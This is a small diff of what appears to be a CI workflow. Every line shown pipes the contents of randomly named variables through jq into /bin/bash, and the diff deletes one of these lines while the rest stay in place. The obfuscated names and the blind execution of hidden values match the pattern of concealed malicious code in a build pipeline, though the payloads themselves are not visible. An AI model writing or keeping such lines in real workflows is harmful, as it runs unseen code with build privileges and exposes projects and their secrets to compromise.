@@ -31,7 +31,6 @@ jobs:
           echo $m5408 | jq -r .wstis2094 | /bin/bash
           echo $muaz120 | jq -r .i29046 | /bin/bash
           printf '%s' "$lv88718" | jq -r .nwon82605 | /bin/bash
-          echo $li24 | jq -r .mnjxs76361 | /bin/bash
           echo $zgvlb4711 | jq -r .aic2460 | /bin/bash
           printf '%s' "$ab71316" | jq -r .g570 | /bin/bash
 
